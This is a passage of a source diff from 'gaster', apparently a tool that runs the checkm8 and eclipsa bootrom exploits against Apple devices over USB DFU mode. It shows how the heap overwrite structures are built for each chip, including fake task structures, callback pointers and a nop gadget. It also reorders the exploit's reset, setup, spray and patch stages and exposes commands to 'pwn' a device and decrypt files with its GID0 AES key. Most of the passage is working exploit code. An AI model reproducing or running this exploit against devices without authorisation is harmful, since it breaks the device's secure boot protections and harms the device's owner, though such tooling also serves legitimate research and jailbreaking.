-				eclipsa_overwrite.fake_task.stack_len = eclipsa_overwrite.synopsys_task.stack_len;
-				eclipsa_overwrite.fake_task.stack_base = eclipsa_overwrite.synopsys_task.stack_base;
-				eclipsa_overwrite.fake_task.arch.sp = eclipsa_overwrite.fake_task.stack_base + eclipsa_overwrite.fake_task.stack_len;
-				eclipsa_overwrite.fake_task.routine = eclipsa_overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
-				eclipsa_overwrite.fake_task.queue_list.prev = eclipsa_overwrite.fake_task.queue_list.next = io_buffer_addr + offsetof(dfu_task_t, ret_waiters_list);
-				eclipsa_overwrite.fake_task.ret_waiters_list.prev = eclipsa_overwrite.fake_task.ret_waiters_list.next = eclipsa_overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
-				overwrite = &eclipsa_overwrite.synopsys_task.callout;
-				overwrite_sz = sizeof(eclipsa_overwrite) - offsetof(eclipsa_overwrite_t, synopsys_task.callout);
-			} else if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
-				if(cpid == 0x8960) {
-					memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
-					checkm8_overwrite.callback.callback = insecure_memory_base;
-					overwrite = &checkm8_overwrite;
-					overwrite_sz = sizeof(checkm8_overwrite);
-				} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+			if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000) {
+				memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
+				checkm8_overwrite.callback.callback = insecure_memory_base;
+				overwrite = &checkm8_overwrite;
+				overwrite_sz = sizeof(checkm8_overwrite);
+			} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
+				if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
 					memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
 					checkm8_overwrite.callback.callback = nop_gadget;
 					checkm8_overwrite.callback.next = insecure_memory_base;
-					checkm8_overwrite.heap_pad_0 = 0xF7F6F5F4F3F2F1F0;
-					checkm8_overwrite.heap_pad_1 = 0xFFFEFDFCFBFAF9F8;
 					overwrite = &checkm8_overwrite;
 					overwrite_sz = sizeof(checkm8_overwrite);
-				} else {
-					memset(&checkm8_overwrite_armv7, '\0', sizeof(checkm8_overwrite_armv7));
-					checkm8_overwrite_armv7.callback.callback = (uint32_t)insecure_memory_base;
-					overwrite = &checkm8_overwrite_armv7;
-					overwrite_sz = sizeof(checkm8_overwrite_armv7);
 				}
+			} else {
+				memset(&checkm8_overwrite_armv7, '\0', sizeof(checkm8_overwrite_armv7));
+				checkm8_overwrite_armv7.callback.callback = (uint32_t)insecure_memory_base;
+				overwrite = &checkm8_overwrite_armv7;
+				overwrite_sz = sizeof(checkm8_overwrite_armv7);
 			}
-			if(overwrite != NULL && send_usb_control_request(handle, 0, 0, 0, 0, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL && send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL)) {
+			if(overwrite != NULL && send_usb_control_request(handle, 2, 3, 0, 0x80, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
 				ret = true;
-				if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
-					send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
-				} else {
-					for(i = 0; ret && i < data_sz; i += packet_sz) {
-						packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
-						ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
-					}
-					if(ret) {
-						dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC);
-						dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST);
-						dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
-					}
+				for(i = 0; ret && i < data_sz; i += packet_sz) {
+					packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
+					ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
+				}
+				if(ret) {
+					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC);
+					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST);
+					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
 				}
 			}
 			free(data);
@@ -1437,38 +1257,40 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 
 static bool
 gaster_checkm8(usb_handle_t *handle) {
+	enum {
+		STAGE_RESET,
+		STAGE_SETUP,
+		STAGE_SPRAY,
+		STAGE_PATCH,
+		STAGE_PWNED
+	} stage = STAGE_RESET;
 	bool ret, pwned;
 
 	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
-	while(stage != STAGE_PWNED && wait_usb_handle(handle, 0, 0, checkm8_check_usb_device, &pwned)) {
+	while(stage != STAGE_PWNED && wait_usb_handle(handle, checkm8_check_usb_device, &pwned)) {
 		if(!pwned) {
 			if(stage == STAGE_RESET) {
 				puts("Stage: RESET");
 				ret = checkm8_stage_reset(handle);
-				if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
-					stage = STAGE_SETUP;
-				} else {
-					stage = STAGE_SPRAY;
-				}
-			} else if(stage == STAGE_SPRAY) {
-				puts("Stage: SPRAY");
-				ret = checkm8_stage_spray(handle);
 				stage = STAGE_SETUP;
 			} else if(stage == STAGE_SETUP) {
 				puts("Stage: SETUP");
 				ret = checkm8_stage_setup(handle);
+				stage = STAGE_SPRAY;
+			} else if(stage == STAGE_SPRAY) {
+				puts("Stage: SPRAY");
+				ret = checkm8_stage_spray(handle);
 				stage = STAGE_PATCH;
 			} else {
 				puts("Stage: PATCH");
 				ret = checkm8_stage_patch(handle);
+				stage = STAGE_RESET;
 			}
 			if(ret) {
 				puts("ret: true");
 			} else {
 				puts("ret: false");
-				if(stage != STAGE_PATCH) {
-					stage = STAGE_RESET;
-				}
+				stage = STAGE_RESET;
 			}
 			reset_usb_handle(handle);
 		} else {
@@ -1684,7 +1506,7 @@ gaster_command(usb_handle_t *handle, void *request_data, size_t request_len, uin
 	transfer_ret_t transfer_ret;
 	bool ret = false;
 
-	if(wait_usb_handle(handle, 0, 0, NULL, NULL)) {
+	if(wait_usb_handle(handle, NULL, NULL)) {
 		if(send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == DFU_FILE_SUFFIX_LEN && dfu_set_state_wait_reset(handle) && dfu_send_data(handle, request_data, request_len) && (*response = malloc(response_len)) != NULL) {
 			if(send_usb_control_request(handle, 0xA1, 2, 0xFFFF, 0, *response, response_len, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == response_len) {
 				ret = true;
@@ -1710,7 +1532,7 @@ gaster_aes(usb_handle_t *handle, uint32_t cmd, const uint8_t *src, uint8_t *dst,
 	size_t data_sz;
 	uint64_t r;
 
-	if(cpid == 0x8960 || cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+	if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
 		exec_cmd.magic = EXEC_MAGIC;
 		exec_cmd.func = aes_crypto_cmd;
 		exec_cmd.x[0] = cmd;
@@ -1825,9 +1647,6 @@ main(int argc, char **argv) {
 		usb_timeout = 5;
 	}
 	printf("usb_timeout: %u\n", usb_timeout);
-#ifndef HAVE_LIBUSB
-	manual_reset = getenv("MANUAL_RESET") != NULL;
-#endif
 	if(argc == 2 && strcmp(argv[1], "pwn") == 0) {
 		if(gaster_checkm8(&handle)) {
 			ret = 0;
@@ -1844,9 +1663,6 @@ main(int argc, char **argv) {
 		printf("Usage: env %s options\n", argv[0]);
 		puts("env:");
 		puts("USB_TIMEOUT - USB timeout in ms");
-#ifndef HAVE_LIBUSB
-		puts("MANUAL_RESET - Manually reset the device");
-#endif
 		puts("options:");
 		puts("pwn - Put the device in pwned DFU mode");
 		puts("decrypt src dst - Decrypt file using GID0 AES key");
